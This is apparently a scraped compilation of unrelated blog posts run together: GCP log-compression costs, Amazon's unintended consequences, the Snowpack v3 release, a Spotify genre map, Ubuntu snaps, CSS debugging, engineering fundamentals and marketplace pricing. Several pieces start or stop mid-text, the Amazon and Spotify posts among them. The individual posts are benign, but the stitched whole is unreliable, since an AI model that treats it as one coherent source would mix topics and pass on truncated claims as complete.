<p>Overall, this solution was quick to implement, easy to debug and should be zero effort to maintain going forward, it should also scale well.</p>

<p>Calculating the cost of this method is less straight forward. I’ve taken a sample of processing performed to compress 61.7GB on a day. It included 548 Class A and Class B GCS invocations, 548 Cloud Function invocations, 5624GHz of CPU time and 5017GiB/seconds of Memory time. We can calculate at the per/GB metric to find out a 91GHZ/seconds and 81GiB/seconds values. This means that if you are not using Cloud Functions for anything else in your organization, a free tier (400,000 GB-seconds memory, 200,000 GHz-seconds of compute time) will be enough to compress 2.2TB of logs monthly at no cost, and it will cost only $0.001 per GB thereafter.</p>
<p>So, with compression, 1000GB will become 83GB or less.</p>

<p>This is <strong>insanely</strong> cheap, storing 1TB of logs at $1.20 per year.</p>

<p>It is possible to archive all of the GCP logs for as little as $1.20 per TB per year. Go Cloud Function makes implementation simple and future maintenance minimal. It is also interesting how the cost of a managed solution is x17 times higher, making it worthwhile to implement a custom solution.</p>

	<div>
		<p>Writing about a range of unintended consequences from a single company is a new format for me. I typically have either looked more widely at effects from a new technology, policy, or event. But many companies create or house second-order effects.</p>
<p>As a start, let’s look at Amazon. Amazon was an easy choice to start with since the company is big ($321 billion in revenue in the past 12 months), has multiple business lines, and is a mix of software, hardware, and people businesses.</p>
<p>This article is long and it really only scratches the surface of some of Amazon’s unintended consequences.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-300x68.png" alt="" width="550" height="125" srcset="https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-300x68.png 300w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-1024x232.png 1024w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-768x174.png 768w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table-1536x348.png 1536w, https://unintendedconsequenc.es/wp-content/uploads/2020/09/Amazons-Unintended-Consequences-table.png 1919w" sizes="(max-width: 550px) 100vw, 550px"><span id="more-2452"></span></p>
<h2>Alexa</h2>
<p><em>Over 100 million devices sold.</em></p>
<p>Amazon’s Alexa smart speaker has changed the way people gain information while going about their day. Alexa customers use hands-free voice as the input method to place orders, ask questions, play entertainment, and more.</p>
<p>For that convenience, Alexa users may find unintentional purchases, including multiple <a href="https://christianchronicle.org/when-the-roll-is-called-up-yonder-alexa-answers/">toilet paper orders</a> initiated by people streaming a preacher’s service. Similar events have happened at other times, including unintentional <a href="https://news.sky.com/story/amazon-cleared-after-alexa-ad-triggers-cat-food-order-11249840">cat food orders and a (somewhat intentional) doll house</a>.</p>
<p>“Accidental” recordings have also happened, for example when a couple’s conversations were <a href="https://www.nytimes.com/wirecutter/blog/amazons-alexa-never-stops-listening-to-you/">recorded and sent</a> to someone on their contact list.</p>
<p>But these incidents seem minor compared to the next examples, which are more about speculative behavior change.</p>
<p>Similar to the way we might speak differently to someone who doesn’t understand our language well, do people adjust the ways they speak to a smart device? Using sarcasm, unusual words, uncommon terms, highly contextual terms — these all create more opportunity to misunderstand. But that risk of misunderstanding may be acceptable when we’re having a conversation with someone we know and like. When it’s a functional task, maybe less so. Also, given that Alexa is a female assistant, does that bring out different behaviors or train different behavior in its users when speaking to human females?</p>
<p>When people become frustrated with Alexa, or are just frustrated because they are having a bad day, Alexa responds with an apologetic voice.</p>
<p>This is called “frustration detection” by Amazon’s Alexa technology group. Frustration detection in other forms has been around for a long time, of course. The original frustration detection is people responding differently to another person’s frustration. Sometimes in an apologetic way and sometimes in an aggressive way depending on the relationship and personality of the respondent.</p>
<p>Less common frustration detection takes place during a customer service exchange. There, a frustrated customer will often (but not always) be treated with deference. The frustration that a customer expresses in a public forum also tends to be more controlled than what they would express in their own home.</p>
<p>As Amazon writes on its <a href="https://blog.aboutamazon.com/devices/amazon-devices-event-september-2019">blog</a>:</p>
<p><em>“As customers continue to use Alexa more often, they want her to be more conversational and can get frustrated when Alexa gets something wrong. To help with this, we developed a deep learning model to detect when customers are frustrated, not with the world around them, but with Alexa. And when she recognizes you’re frustrated with her, Alexa can now try to adjust, just like you or I would do.”</em></p>
<p>Does this change people when these exchanges are with a machine rather than a human?</p>
<p>Researchers have studied Alexa’s responses (as well as those of other voice assistants) for a while. This <a href="https://qz.com/911681/we-tested-apples-siri-amazon-echos-alexa-microsofts-cortana-and-googles-google-home-to-see-which-personal-assistant-bots-stand-up-for-themselves-in-the-face-of-sexual-harassment/">2017 article</a> gives a good breakdown of what was found related to “device harassment” back then.</p>
<p>Will being able to talk naturally, including with frustration, impact the way people — and especially observing kids — learn to interact with others? This is what some researchers wonder. I don’t believe that anyone knows the answer.</p>
<p>Rough estimates are that <a href="https://marketingland.com/roughly-1-in-4-u-s-adults-now-owns-a-smart-speaker-according-to-new-report-273994">one-quarter</a> of US households own a smart speaker, of which Alexa is the most common device. At 128 million US households, even a small impact on the one-quarter of them owning smart speakers can make a big difference in outcomes. As with many of Amazon’s unintended consequences, size alone accounts for a lot of the potential impact.</p>
<ul>
<li>Causes of the unintended consequences: Alexa interacts with and adjusts to abuse.</li>
<li>Counteractions: Program Alexa to ignore, push back, or misunderstand the abuse? Do we even understand the effects in order to know how to respond?</li>
</ul>
<h2>Investing</h2>
<p><em>The investment arm has a parent company.</em></p>
<p>The <a href="https://developer.amazon.com/en-US/alexa/alexa-startups/alexa-fund">Amazon Alexa Fund</a> raised $200 million for investing to “fuel voice technology innovation.” The fund invested in 91 startups to date.</p>
<p>As a driver of voice-enabled hardware, Amazon has beneficially supported startups that build on top of its own Alexa hardware. By pushing more investment into voice-related innovation, Amazon benefits and also gets to learn what others are doing in this space.</p>
<p>Amazon’s investment arm is different from other VCs in that its parent company is also potentially a competitor to its portfolio companies.</p>
<p>Related to that, Amazon’s investment arm has been accused of benefiting from and copying the work of startups that pitched to it or that it invested in.</p>
<p>The following is a series of quotes about this issue, from <span>the <a href="https://www.wsj.com/articles/amazon-tech-startup-echo-bezos-alexa-investment-fund-11595520249"><em>Wall Street Journal</em></a>:</span></p>
<p><em><span>“In some cases, Amazon’s decision to launch a competing product devastated the business in which it invested. In other cases, it met with startups about potential takeovers, sought to understand how their technology works, then declined to invest and later introduced similar Amazon-branded products, according to some of the entrepreneurs and investors.”</span></em></p>
<p><em>“In 2010, Amazon invested in daily-deals website LivingSocial, gaining a 30% stake and representation on the startup’s board. Former LivingSocial executives said Amazon began requesting data. ‘They asked for our customer list, merchant list, sales data. They had a competitive product and they demanded all of this,’ said one former executive. LivingSocial declined to hand over the data, this person said.”</em></p>
<p><em>“LivingSocial executives began hearing from clients that Amazon was contacting them directly and offering them better terms, some former executives said. Amazon also began hiring away LivingSocial employees.”</em></p>
<p><em>“‘They are using market forces in a really Machiavellian way,’ said Jeremy Levine, a partner at venture-capital firm Bessemer Venture Partners. ‘It’s like they are not in any way, shape or form the proverbial wolf in sheep’s clothing. They are a wolf in wolf’s clothing.'”</em></p>
<p>I have known of investors — typically in small markets where founders have few options — to use predatory techniques like this. With any corporate investing arm, startups seeking investment should be a bit more careful. But even with no intent, Amazon is large enough that issues like this might just happen because the company is so large it’s hard to know what’s going on in every corner of it.</p>
<p>In June 2020, Amazon announced that it is building a <a href="https://www.wsj.com/articles/amazon-to-launch-2-billion-venture-capital-fund-to-invest-in-clean-energy-11592910001">$2 billion fund</a> to invest in clean energy.&nbsp;<a href="https://sustainability.aboutamazon.com/about/climate-pledge-fund">The Climate Pledge Fund</a>, will invest in companies building transportation, energy generation, battery storage, manufacturing and food and agriculture innovations. This might be the next group of startups affected.</p>
<ul>
<li>Causes of the unintended consequences: Competitive nature of the parent company. Using pitch meetings as intelligence gathering.</li>
<li>Counteractions: More care by founders in who to pitch and what information to reveal.</li>
</ul>
<h2>AWS</h2>
<p><em>AWS is the most common cloud infrastructure service.</em></p>
<p>Amazon Web Services (AWS) is the most common cloud infrastructure providers, at 33% market share. That means that many companies use AWS for hosting company data, sensitive documents, customer credentials, bank statements, correspondence, logs, code, and more.</p>
<p>The pervasiveness of AWS means that engineers have a natural benefit to knowing how to use AWS, as opposed to, say, Microsoft’s Azure or Google Cloud. But that pervasiveness also means that many data breaches happen on AWS as well.</p>
<p>AWS-related data breaches include exposed data by a <a href="https://siliconangle.com/2019/09/02/uk-travel-company-exposes-customer-calls-misconfigured-cloud-storage/">travel company</a> (500,000 customer transactions exposed), by <a href="https://siliconangle.com/2017/10/11/accenture-left-private-data-exposed-public-misconfigured-aws-s3-bucket/">Accenture</a> (“authentication credentials, certificates, decryption keys, customer information” exposed), and Dow Jones (2.2 million customer records exposed). More interestingly, there have also been breaches by departments of the <a href="https://techcrunch.com/2017/11/28/army-nsa-inscom-aws-leak/">military</a> and their contractors (top secret information exposed).</p>
<p>Data breaches also come from <a href="https://www.upguard.com/breaches/identity-and-access-misstep-how-an-amazon-engineer-exposed-credentials-and-more">Amazon engineers</a> themselves (passwords and AWS key pairs exposed).</p>
<ul>
<li>Causes of the unintended consequences: Many employees and contractors with customer data access and authorization to edit entitlements to that data. Pervasiveness of use.</li>
<li>Counteractions: Better management of a complicated process.</li>
</ul>
<h2>Marketplace Product Reviews</h2>
<p><em>Amazon is the default search engine for products.</em></p>
<p>Through Amazon Marketplace, third-party sellers have grown to account for over half of items sold since 2017. When just about anyone can sell on Amazon it is necessary to judge quality communally. But that can lead to second-order effects.</p>
<p>One way that sellers give themselves an edge is to manipulate the reviews of their competitors. Examples of this manipulation are the direct: buying a competitor’s product and giving it a low review but also the more sophisticated: giving fake high <a href="https://www.theverge.com/2018/12/19/18140799/amazon-marketplace-scams-seller-court-appeal-reinstatement">reviews</a> for competitors to later report them for review manipulation.</p>
<p><a href="https://www.theverge.com/2018/12/19/18140799/amazon-marketplace-scams-seller-court-appeal-reinstatement">Types of attack</a> include paying people to write five-star reviews for a competitor in order to get the product flagged, hijacking a competitor’s brand, gaining illegal access to competitors’ products through illicit access to a distributor’s account, and even buying a competitor’s products only to set them on fire, post pictures, and then complaining about the danger.</p>
<p>One of the reasons that Amazon could grow so large is that they enable third-party sellers in their market. But with an organization this large, that touches so many buyers and sellers, there is a necessary loss of individual control in favor of algorithmic or decision-tree approaches.</p>
<p>Another version of the fake reviews is to create a …</p></div></article></div>

      <p><strong>tl;dr:</strong> Snowpack v3.0 will release on January 6th, 2021 (the one-year anniversary of its original launch post). This is our biggest release yet with some serious new features, including <strong>a new way to load npm imports on-demand</strong> and skip the frontend <code>npm install</code> step entirely.</p>
<p>Best of all: it’s all available to try today!</p>
<h2 id="what%E2%80%99s-new%3F">What’s New?</h2>
<p>Snowpack v3 will focus on the polish &amp; official release of four features already available today in the current version of Snowpack (v2.18.0) under the <code>experiments</code> flag:</p>
<ul>
<li><code>experiments.source</code>- Streaming npm imports, no install step required.</li>
<li><code>experiments.optimize</code> - Built-in bundling, preloading, and asset minifying.</li>
<li><code>experiments.routes</code> - Advanced config for HTML fallbacks and API proxies.</li>
<li><code>import 'snowpack'</code> - A brand new JavaScript API for Snowpack integrations.</li>
</ul>

</video>
<h2 id="new%3A-streaming-npm-imports">New: Streaming NPM Imports</h2>
<p>Snowpack has always pushed the limits of frontend development, and this release is no different. Snowpack v3.0 introduces an exciting new feature to speed up &amp; simplify your development workflow.</p>
<p>Typically, JavaScript dependencies are installed and managed locally by a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. Packages are often bloated with unrelated files and almost never run directly in the browser. Additional steps are required to process, build and bundle these installed packages so that they can actually run in browser.</p>
<p><strong>What if we could simplify this? What if Snowpack could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM?</strong></p>
<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every npm package as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline without relying on Skypack besides the first package fetch.</p>
<p>This has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies as pre-build ESM code directly from the Skypack CDN.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever run in the browser sandbox.</li>
<li><strong>Simplicity:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Same Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact imports, resulting in a final build that’s nearly identical.</li>
</ul>
<p>If this all sounds too wild for you, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-npm-imports">Streaming NPM Imports</a> to learn more about how to enable this new behavior in your project today. In a future release, we hope to open this up to custom ESM package sources and other CDNs as well.</p>

<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers and over 300x faster than Parcel (by esbuilds own benchmarks). esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is a post-build optimization, and not the core foundation that everything is built on top of.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but it’s future looks promising. In the meantime, we will also continue to invest in the existing Webpack &amp; Rollup bundler plugins for a long time to come.</p>
<p>To get started, check out the <code>experiments.optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-routes.png" alt="js api"></p>
<h2 id="routing">Routing</h2>
<p>Snowpack’s new <code>experiments.routes</code> configuration lets you define routes that align your dev environment with production. This unlocks some interesting new use-cases, including:</p>
<ul>
<li><strong>API Proxies</strong> - Route all <code>/api/*</code> URLs to another URL or localhost port.</li>
<li><strong>SPA Fallbacks</strong> - Serve an app shell <code>index.html</code> to all requested routes.</li>
<li><strong>Faster Site Loads</strong> - Speed up your site and serve different HTML shell files for each route.</li>
<li><strong>Island Architecture</strong> - Serve HTML that renders individual components on the page, in parallel. (Made popular by <a href="https://twitter.com/_developit">Jason Miller</a> in <a href="https://jasonformat.com/islands-architecture/">this blog post</a>).</li>
<li><strong>Mimic Vercel/Netlify</strong> - Re-create your Vercel or Netlify routes in development. Or, create a Snowpack plugin to automatically generate these routes from your <code>vercel.json</code> or <code>_redirects</code> file at startup.</li>
</ul>
<p>While API proxying and SPA fallbacks have already been supported in Snowpack for a while now, this brings them all together into a single, expressive new API.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p>The Svelte team recently made news with <a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a>: An official, zero-effort SSR app framework for Svelte apps. SvelteKit is powered internally by Snowpack, using our brand-new JavaScript API to manage your build pipeline and build files on-demand. Snowpack speeds up development and helps to cut SvelteKit’s startup time to near-zero.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack. Or, read through our new guide on <a href="https://www.snowpack.dev/guides/server-side-render">Server-Side Rendering</a> to get started with a custom SSR integration for production.</p>
<h2 id="installation">Installation</h2>
<p>You can install the Snowpack v3.0 release candidate today by running:</p>
<pre><code>npm install snowpack@next
</code></pre>
<p>Since all v3.0 features already exist in Snowpack today, our existing documentation site applies to both v2 &amp; v3. At this point only very old, undocumented, legacy behavior has been removed from the <code>next</code> v3.0 branch.</p>
<p>Features under the <code>experiments</code> flag may continue to change as we get closer to the official release date. By the end of the year, you can expect that these features will move out from behind the <code>experiments</code> flag and into top-level config objects in the <code>next</code> v3.0 branch.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

            <p>
              I am sure, you have been asked "Hey, what do you listen
              to?" a million times. Some people can easily answer that
              question. I never could. Until now.

              Thanks to the new digital data collecting behemoths that
              record our every moves, I can tell you exactly, what
              music I listen to! I am a Spotify user and they told me at
              the end of 2019:
            </p>

            <p><img src="http://www.ph-uhl.com/0009-Music-Genres/myGenres1.svg" alt="A depiction of the genres, I listen to most, as
                        compiled by Spotify:
                        Electro House, Dance Pop, Rock, Hip hop, Big beat."></p><p>
              When I saw this, I was thrilled. Finally an answer,
              depicted in a nice diagram. A hard question, broken down
              to just five genres, even showing me, how much I like
              each of them. Just, that this picture does not. My
              thrill puffed away, as soon as I saw a few of my
              friends' diagrams. They looked exactly the same. Sure,
              the genres were different, but the graphic shows the
              same distribution, the same five bars with the same
              heights. Spotify cut some corners and did not use their
              vast amount of data to satisfy my desire for insight.
            </p>

            <p>
              That did not sit right with me, so I decided to take
              upon that issue myself and I came up with my own graphic:
            </p>

            <p><img src="http://www.ph-uhl.com/0009-Music-Genres/myGenres2.svg" alt="A depiction of the genres, I listen to most, as
                        compiled by me:
                        Electronic, Big beat, Pop, Downtempo, Dance pop."></p><p>
              When looking at this graph, it becomes clear, why
              Spotify went with their designers instead of their data
              analysts on displaying this graph. But still.
            </p>

            <p>
              While this fun little graph, now upholds to my pedantic
              standards, it does not really answer all the questions I
              have. That's why I went totally overboard and
              created a four-dimensional space of all the genres I
              listen to (at the bottom of this page). But where did I
              get the data from, and <strong>how can you create your own
              multi-dimensional
              genre map?</strong>
            </p>

            <highlight>
              Tldr; <a href="#the_meat">Take me to the visualization</a>
            </highlight>

            <p>
              When the European Union slowly realized that it is loosing
              the race in internet behemoism, they decided, instead
              they could try to stop the user data export to the United
              States. This was attempted by introducing a new legislation,
              the well known GDPR ("General Data Protection
              Regulation"). It was introduced on May the 25th, 2018
              and is one of multiple legislations that aims at
              protecting consumers online. And the best part: With
              virtually no international web-based giants, the
              introduction of GDPR would
              not even hurt the big European web companies (because there
              are none). On thing, GDPR does: It makes it mandatory for companies to provide
              their users with the ability to receive all the personal
              user generated data on request. In the case of Spotify
              you can just download all the songs you liked as a handy
              machine-readable file. That is what I did. And I analyzed it.
            </p>
            <p>
              For plotting my genres onto a multi-dimensional
              space, Spotify plays a second role, as well:
              In 2014 Spotify bought "The Echo Nest", a company,
              focused on  music analysis.
              Glenn McDonald, an employee and data engineer of "The
              Echo Nest", made an affort to analyze into what genres the
              music on Spotify can be devided and how these
              genres relate to each other. If you haven't seen it yet,
              you should totaly check out Glenn's site
              <a href="http://everynoise.com/">everynoise.com</a>.
              Over there,  all the genres that Glenn's analysis
              produced are plotted in relation to each other, with
              bands and songs of these genres, available with just a
              few clicks. Even if you are not as much a
              data-visualization-fetishist as I am, it is worth a
              look. Not only does Glenn track over 3.000 genres, he
              also provides many playlists for all these genres and a
              lot more. Go. Check. It. Out. Then come back here... ;)
              If you have, you will notice a slight resemblance with
              what you see on the bottom of this website, but more on
              that in a sec.
            </p>
            <p>
              What has Glenn's effort of tracking genres to do with
              us?  After scraping the genres, I can put them into
              relation with the music of my own liking by just show
              the genres, I listen music from. And these are displayed
              in different sizes, based on how many songs in that
              particular genre I have liked on Spotify.

            </p>
            <h2>Surprizing Insights: I listen to "lgbtq+ hip hop"
              <small>Wait, thats a genre?</small>
            </h2>
            <p>
              Some insights are in sight. The
              data is presented in the same way as it is on Every
              Noise. About the orientation from left to right and top
              to bottom I will let Every Noise speak for them selfs:
            </p>

            <highlight>
              "The calibration is fuzzy, but in general down
              is more organic, up is more mechanical and electric;
              left is denser and more atmospheric, right is spikier
              and bouncier".
            </highlight>

            <p>
              Turns out, I like quite a broad spectrum of music but I
              do have a focus on the electronic, hip-hop, rapish,
              poppy, rocky music. Below are my top 15 genres with the
              amount of songs:

              My music collection does offer some weird outliers. I
              was amused to see that I apparently am listening
              to "lgbtq+ hip hop". Apparently, Azealia Banks is responsible
              for this lable. Yes, that rough racism tweeting music marvel
              who raps about loving white dick
              (click to play: <span nolink="true" onclick="tryToPlay(this, 'Azealia Banks', ['Liquorice'])">Liquorice</span>) or here iciness
              (<span nolink="true" onclick="tryToPlay(this, 'Azealia Banks', ['Ice princess'])">Ice princess</span>).
            </p>
            <p>
              It also becomes apparent, how international music can be
              nowadays. I listen to Slovenian electronic, Brazilian
              electronica, Swedish (synth | synthpop | electropop |
              pop | indie pop), French hip hop, Australian, Icelandic, Mexican, South
              African, and Austrian pop, South African alternative,
              Cape Town indie, Russian (rock | trap | hip hop | pop),
              British (insert long list of genres here), German (metal
              | pop | punk | rock | hip hop | techno | baroque), and
              many US American genres. The list
              goes on.
            </p>
            <p>
              Now, let's take a look at the genre space! (Depending on your
            screen size, some scrolling might be required.)

<p>On Ubuntu Linux <a href="https://snapcraft.io/about">snaps</a> are app packages for desktop, cloud and IoT that are easy to install, secure, cross‐platform and dependency‐free and their main selling point is security and <a href="https://snapcraft.io/docs/snap-confinement">confinement</a>. </p>



<p>Traditionally packaging for Ubuntu is via .deb packages but much as I try, I never find it straight forward to create or maintain deb packages and I find creating snap packages much easier. </p>



<p>One use case of snaps which doesn’t get talked about much is using snaps to bring no longer supported software back to life. For example, in Ubuntu 20.10 (Groovy Gorilla) which is soon to be released there is no longer support for python2 by default and many other packages have been deprecated too in favour of newer and better replacements. This does mean though that packages which depended on these deprecated packages are not installable and will not run. Snaps can fix this.</p>



<p>Snaps have the concept of <a href="https://snapcraft.io/docs/base-snaps">Base snaps</a> where is snap can specify a runtime which is based on a previous release of Ubuntu.</p>



<ul><li>core20 base is based on Ubuntu 20.04</li><li>core18 base is based on Ubuntu 18.04</li><li>core base is based on Ubuntu 16.04</li></ul>



<p>As such you can create snap packages of any software that is installable on any of these previous Ubuntu releases and run that snap on newer releases of Ubuntu.</p>



<p>My workflow relies on many applications, most of which are still installable on Ubuntu 20.10 but I have found three that are not.</p>



<ul><li><a href="http://doc.bazaar.canonical.com/explorer/en/">bzr-explorer</a></li><li><a href="https://github.com/kozec/syncthing-gtk">syncthing-gtk</a></li><li><a href="https://kitematic.com/">kitematic</a></li></ul>



<p>To unblock my workflow I created snaps of these @ <a href="https://github.com/philroche/bzr-explorer-snap">https://github.com/philroche/bzr-explorer-snap</a>, <a href="https://github.com/philroche/syncthing-gtk-snap">https://github.com/philroche/syncthing-gtk-snap</a> and <a href="https://github.com/philroche/kitematic-snap">https://github.com/philroche/kitematic-snap</a> which are all snaps using the core18 and core20 base snaps.</p>



<p>Note that these snaps are classic snaps and are not confined as is <a href="https://snapcraft.io/docs/snap-confinement">recommended for most snaps</a> but it does unblock my workflow and is a neat use of snap packaging. </p>



<p>If you need help packaging a deprecated deb package as a snap please reach out. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Cheat sheets.</p><p>Well-designed, terse, and easily accessible.</p><p>If there’s one thing I can think of that makes debugging CSS harder, it’s cheat sheets.</p><p>At first glance, this probably doesn’t sound like it makes a lot of sense. Aren’t cheat sheets supposed to be an easy way to fast-track learning CSS? And doesn’t learning CSS help in debugging it?</p><p>Funnily enough, the answer to the latter is yes. As we will soon see, the problem is with the assumption held within the former. </p><p>While a greater understanding of CSS is indeed key to making debugging it easier, the method of gaining that understanding is certainly not in cheat sheets. In fact, the use of cheat sheets lives on the opposite end of the spectrum, with regards to what you should be doing when wanting to truly understand CSS.</p><p>What cheat sheets focus on is the memorization of specific pieces of information. Often in isolation. </p><p>Understanding on the other hand is about gaining a holistic, <em>connected</em> view. One that gives you the ability to see each part of what you’re learning within the context of everything else that you’ve learned.</p><p><em><strong>And this is key to debugging effectively.</strong></em></p><p>As any experienced programmer has probably found, the source of a bug is usually not at the location of the bug itself, but somewhere else in the system. Being able to see the big picture (a function of understanding), allows you to locate and solve the bug a lot faster. </p><p>Genuine understanding is kind of like a linked network. Once you have it, parsing the network becomes a more efficient process.</p><p>Memorization of independent ‘nodes’ within the network, without any context (what cheat sheets facilitate) does not give you this superpower.</p><p>Developers also have a tendency to become myopic when writing code. This is usually a benefit whose trade-offs are not easily seen in most development work.</p><p>Within the scope of programs, developers, even when ‘zoomed-in’ to a piece of code, find it easier to still see the bigger picture. This is because developers generally have a deeper understanding of the languages that they are using because the languages are more logical.</p><p>CSS is a bit less so. </p><p>While with development, zooming-in can often be a benefit, with CSS, a more visual, right-brained sort of a language, zooming out and seeing the big picture, is a lot more important.</p><p>Because of this inherent difference in CSS as compared to more conventional programming based languages, developers tend to underestimate it, and therefore tend to not learn it in such a way that they gain a true, networked ‘understanding’ of it on an intuitive level that they should. </p><p>This is what makes debugging CSS so difficult for most developers.</p><p>Layouts, and creating them, are not understood as being logical in the same way. And because of this developers both underestimate and fail to truly understand CSS. This makes it hard to see the complete context of the problems that come up when they’re writing CSS, and therefore makes CSS issues harder to debug.</p><p>So how can this be solved?</p><p><strong>There are two approaches that are particularly effective:</strong></p><p>- By <a target="_blank" title="https://planflow.dev/blog/how-to-get-better-at-css/" href="https://planflow.dev/blog/how-to-get-better-at-css/">re-framing CSS</a>, coming at it from the more logical perspective.</p><p>- By deepening knowledge of CSS (the language, and how it works) in order to gain a more intuitive feel for it, and how it is used to construct layouts.</p><p>Combining these two steps will allow you to SEE the big picture when writing CSS. And when you can do this, even when you ‘zoom in’ and get myopic, the big picture will still be visible to you. </p><p>You can still solve problems.</p><p>--</p><p><em>This is an excerpt from </em><a title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>.

<p>2020-11-30</p>

<p>The fundamentals transcend the particular technology choices and the current trends, underlying most what a practitioner does. Investing in a deep mastery of the fundamentals always pays off by allowing one to really understand other adjacent concepts in terms of its more essential pieces. Unlike someone who is supposed to follow pre-determined procedures and apply handed-down knowledge, an engineer should be able to devise procedures and create novel knowledge from first principles.</p>

<p><strong>Computer Programming</strong> – Being able to fluently express ideas in a high-level imperative language such as <em>Python</em>, <em>Java</em>, <em>JavaScript</em> or <em>C</em>. For at least one of those languages, fully understand variables, data types, control flow, arrays, functions (or methods), pointers, pass-by-value vs pass-by-reference, scoping, structures (or objects and classes), console and file input/output. Understanding the binary numerical system and IEEE floating point representation. Understanding ASCII and Unicode character representations.</p>

<p><strong>Computer Algorithms</strong> – Knowing how to evaluate the time and space complexity of classic and ad-hoc algorithms. Knowing the basics about sorting algorithms and string matching. Being able to devise and implement ad-hoc algorithms with efficient time complexity. Being able to devise and implement ad-hoc recurrent algorithms.</p>

<p><strong>Data Structures</strong> – Knowing the trade offs and when to use stacks, queues, priority queues (heaps), hash tables (dictionaries or maps) and dynamically-sized arrays. Knowledge about graphs and trees. Knowledge about fundamental graph algorithms: breadth-first search, depth-first search and topological sort.</p>

<p><strong>Version Control Systems</strong> – Understanding and being able to use <em>git</em> to version control source-code, submit pull requests, perform and undergo code reviews.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type-cleanup="true">

<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/62134f7d-7b7f-a46f-4850-8b0860c5df69.jpg"></p>
<p>A marketplace consists of supply - provided by sellers and demand - created by buyers. </p>
<p>A marketplace matches buyers with sellers. </p>
<p>We consider real or virtual goods (items). We do not consider here service marketplaces such as Uber.</p>
<p>A fundamental function of the marketplace is the pricing of items transacted through the market. </p>
<p>What mechanism can the marketplace use to set the price of the items sold through the market?</p>

<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/48333b15-35d8-e01d-acdb-5a634453e637.jpg"></p>
<p>There are three basic models. </p>
<h2>Fixed Price</h2>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/32f6be8d-4fa4-5247-080f-726bea6e2e64.jpg"></p>
<p>The traditional model of pricing is the fixed price per item. A seller sets a price. A buyer either buys the thing at the set price and or not.</p>
<h2>Auction</h2>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/5f5f27ce-10be-f5fe-1048-dc7e37d11e41.jpg"></p>
<p>An old but less used model for pricing is to carry an auction for an item. In an auction, buyers place bids with an increasing price for an item until one buyer wins. Usually, an auction runs for a predetermined duration. </p>
